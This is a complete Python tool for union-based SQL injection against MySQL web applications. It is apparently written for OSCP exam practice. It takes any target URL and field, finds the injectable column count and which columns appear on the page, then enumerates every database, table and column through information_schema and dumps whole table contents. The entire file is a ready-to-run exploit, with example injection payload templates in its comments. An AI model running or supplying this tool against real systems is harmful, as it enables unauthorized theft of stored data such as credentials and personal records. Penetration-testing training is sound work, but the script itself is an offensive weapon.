#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# UNION-based SQLi dumper (MySQL) - interactive, auto-calibrating
# Oracle = data REFLECTED on the page. A UNION SELECT appends an attacker row
# whose visible column(s) render straight into the response - so each value is
# read in ONE request (no binary search). This is the fastest SQLi type; use it
# whenever query output shows up on screen.
#
# Calibration finds two things in one loop: the column count (UNION only works
# when it matches) and which column positions are visible (markers appear in
# the response). Everything after reads group_concat() out of a visible column.
#
# Methods: GET (query string), POST (body).
# Base value should return NO rows so only the injected UNION row shows, e.g.
#   numeric GET : 0 UNION SELECT [INJECT]-- -
#   string login: -1' UNION SELECT [INJECT]-- -
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import re
import sys

# Highest column count to probe during calibration.
MAX_COLS = 20

# --- Interactive config ----------------------------------------------------
print("=== UNION-based SQLi dumper ===")
METHOD       = input("Request method GET or POST                   : ").strip().upper()
if METHOD not in ("GET", "POST"):
    METHOD = "GET"
URL          = input("Target URL                                   : ").strip()
INJ_FIELD    = input("Injectable field name (e.g. id / username)   : ").strip()
OTHER_FIELD  = input("Other POST field name (blank if none)        : ").strip() if METHOD == "POST" else ""
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
# Template with [INJECT] where the UNION column list is spliced in. [INJECT]
# receives the comma-joined columns (markers during calibration, then the
# leak expression). Only the break-out + UNION SELECT go in the template.
# numeric GET : 0 UNION SELECT [INJECT]-- -
# string login: -1' UNION SELECT [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

# --- Request sender (GET -> query string, POST -> body) --------------------
def send(payload):
    if METHOD == "GET":
        params = {INJ_FIELD: payload}
        if OTHER_FIELD:
            params[OTHER_FIELD] = OTHER_VALUE
        return requests.get(URL, params=params)
    data = {INJ_FIELD: payload}
    if OTHER_FIELD:
        data[OTHER_FIELD] = OTHER_VALUE
    return requests.post(URL, data=data)

# --- Calibration: column count + visible positions -------------------------
# Put a distinct hex-encoded marker in every column. UNION only succeeds when
# the count matches, so the first k where any marker reflects IS the column
# count, and the markers that show reveal the visible positions.
def marker_plain(i):
    return f"qzxq{i}qxzq"

def find_columns():
    for k in range(1, MAX_COLS + 1):
        cols = [f"0x{marker_plain(i).encode().hex()}" for i in range(k)]
        payload = TEMPLATE.replace("[INJECT]", ",".join(cols))
        text = send(payload).text
        visible = [i for i in range(k) if marker_plain(i) in text]
        if visible:
            return k, visible
    return None, []

print("\n[*] Calibrating column count and visible columns...")
NCOLS, VISIBLE = find_columns()
if not NCOLS:
    print(f"[!] No UNION reflection up to {MAX_COLS} columns.")
    print("    - Check the template break-out (numeric vs quoted).")
    print("    - The base value must return no rows (use -1 / 0).")
    print("    - Output may not be reflected -> use blind/error/time instead.")
    print(f"    template = {TEMPLATE!r}")
    sys.exit(1)
POS = VISIBLE[0]
print(f"[+] Columns: {NCOLS} | visible positions: {VISIBLE} | using position {POS}\n")

# --- Core leak (one request per value; wrapped in ~...~ for parsing) --------
MARK = re.compile(r"~(.*?)~", re.S)
def leak(subquery, label=None):
    """Read a value by placing it in the visible column, marked with ~...~.
    (group_concat has a default 1024-byte cap; huge columns may truncate.)"""
    cols = ["NULL"] * NCOLS
    cols[POS] = f"concat(0x7e,({subquery}),0x7e)"
    payload = TEMPLATE.replace("[INJECT]", ",".join(cols))
    r = send(payload)
    m = MARK.search(r.text)
    out = m.group(1) if m else ""
    if label is not None:
        sys.stdout.write(f"{label}{out}\n")
    return out

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("      " + bar)
    print("      " + fmt(headers))
    print("      " + bar)
    for row in rows:
        print("      " + fmt(row))
    print("      " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = leak(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = leak(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = leak(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # One single-arg group_concat per column - same shape that dumps names.
    # (Caveat: a value containing a comma would misalign that column.)
    columns_data = []
    for c in cols:
        q = f"SELECT group_concat({c}) FROM {db}.{table}"
        s = leak(q, label=f"    {c}: ")
        columns_data.append(s.split(",") if s else [])
    n = max((len(cd) for cd in columns_data), default=0)
    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
    print()
    render_table(cols, rows)

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
